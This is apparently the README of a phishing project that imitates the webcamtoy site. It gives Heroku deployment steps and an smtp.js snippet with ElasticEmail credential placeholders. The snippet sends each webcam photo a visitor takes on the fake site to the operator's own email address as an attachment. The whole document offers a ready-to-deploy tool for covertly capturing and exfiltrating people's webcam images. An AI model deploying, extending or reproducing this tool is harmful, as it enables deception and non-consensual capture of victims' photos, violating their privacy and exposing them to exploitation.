


<h1 align="center">
<br>
  <img src="/docs/logo.png" alt="Webcam Not a Toy" width="200">
</h1>

<p align="center">A webcamtoy website phishing to send photos in email</p>

<p align="center">
  <img src="/docs/page-1.png" width=450 title="Login">
  <img src="/docs/page-4.png" width=400 title="Login">
</p>
<br>

## photo --> your email

<p align="center">
  <img src="/docs/page-2.png" width=450 title="Login">
  <img src="/docs/page-3.png" width=420 title="Login">
</p>

## Features
- API Email Service ( ElasticEmail )
- Send Webcam Photo by email after shoot

## Deploy
- I'm using [heroku](https://heroku.com)
- Create a heroku app
- Fork this repository on yout github
- Connect your github with heroku [video example](https://www.youtube.com/watch?v=3tK9qIdoJ6I)
- Add heroku/php buildpack
- Done!

## Email API
- Create an Account in [ElasticEmail](https://elasticemail.com/) ( IS FREE )
- Set creadentials of the [smtp.js](https://smtpjs.com/) library  
```js
var _EMAIL="your_elastic_email@gmail.com"
var _PASS="your_elastic_api_key"
var _TO="your_email@gmail.com"
var _HOST='smtp.elasticemail.com'

Email.send({
  Host,       // _HOST Variable
  Username,   // _EMAIL Variable
  Password,   // _PASS Variable
  To,         // _TO Variable
  From,       // _EMAIL Variable
  Subject,    // Title of Email
  Body,       // Text of Email
  Attachments // Photo File
})
```
